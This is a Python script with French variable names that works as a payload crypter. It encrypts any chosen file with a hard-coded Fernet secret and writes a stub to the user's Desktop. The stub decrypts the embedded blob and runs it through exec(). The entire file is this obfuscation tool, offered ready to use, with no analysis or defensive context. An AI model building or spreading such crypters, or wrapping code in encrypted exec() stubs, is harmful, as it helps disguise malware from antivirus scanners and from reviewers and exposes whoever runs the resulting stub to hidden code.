import os
import base64
import hashlib
from cryptography.fernet import Fernet

BANNIERE = r"""
 ________ _____    _______           __
 \_____  \\__  \   \      \         |__|
  /   |   \/ __ \_ /   |   \        |  |
 /    |    \  ___//    |    \       |  |
 \_______  /\___  >____|__  /       |__|
         \/     \/        \/
"""

def lire_payload(chemin):
    with open(chemin, "rb") as f:
        return f.read()

def chiffrer_payload(data):
    sel = os.urandom(16)
    secret = b"palofsc-internal-secret-2026"
    cle = base64.urlsafe_b64encode(hashlib.sha256(sel + secret).digest())
    f = Fernet(cle)
    return sel, f.encrypt(data)

def encoder(data):
    return base64.b64encode(data).decode()

def generer_stub(sel_b64, payload_b64):
    return f'''import base64
import hashlib
from cryptography.fernet import Fernet

_sel = base64.b64decode("{sel_b64}")
_secret = b"palofsc-internal-secret-2026"
_cle = base64.urlsafe_b64encode(hashlib.sha256(_sel + _secret).digest())

_payload_chiffre = base64.b64decode("{payload_b64}")

_f = Fernet(_cle)
_payload = _f.decrypt(_payload_chiffre)

exec(_payload)
'''

def ecrire_stub(chemin, contenu):
    with open(chemin, "w", encoding="utf-8") as f:
        f.write(contenu)

def pause():
    try:
        input("\nEnter for close...")
    except Exception:
        pass

def main():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        pass

    print(BANNIERE)
    print()

    try:
        source = input("[?] file path : ").strip()
        source = source.strip('"').strip("'")

        if not source or not os.path.isfile(source):
            print("[!] File not found :", source)
            pause()
            return

        sortie = input("[?] Name (defaut: stub.py) : ").strip()
        if not sortie:
            sortie = "stub.py"
        if not sortie.endswith(".py"):
            sortie += ".py"

        bureau = os.path.join(os.path.expanduser("~"), "Desktop")
        if not os.path.isdir(bureau):
            bureau = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
        if not os.path.isdir(bureau):
            bureau = os.path.join(os.path.expanduser("~"), "OneDrive", "Bureau")
        if not os.path.isdir(bureau):
            bureau = os.path.join(os.path.expanduser("~"), "Bureau")

        if not os.path.isdir(bureau):
            print("[!] Unable to locate the Desktop.")
            pause()
            return

        chemin_sortie = os.path.join(bureau, sortie)

        print("\n[*] Generation in progress...")

        payload = lire_payload(source)
        sel, payload_chiffre = chiffrer_payload(payload)
        sel_b64 = encoder(sel)
        payload_b64 = encoder(payload_chiffre)
        stub = generer_stub(sel_b64, payload_b64)
        ecrire_stub(chemin_sortie, stub)

        print("[+] Generated stub :", chemin_sortie)
        print("[+] Original size :", len(payload), "octets")
        print("[+] Encrypted size :", len(payload_chiffre), "octets")
        print()
        print("[i] Execution : python", '"' + chemin_sortie + '"')

    except ImportError as e:
        print("[!] Module manquant :", e)
        print("[i] Executez : pip install cryptography")
    except PermissionError as e:
        print("[!] Permission refusee :", e)
    except Exception as e:
        print("[!] Erreur :", type(e).__name__, "-", e)
    finally:
        pause()

if __name__ == "__main__":
    main()
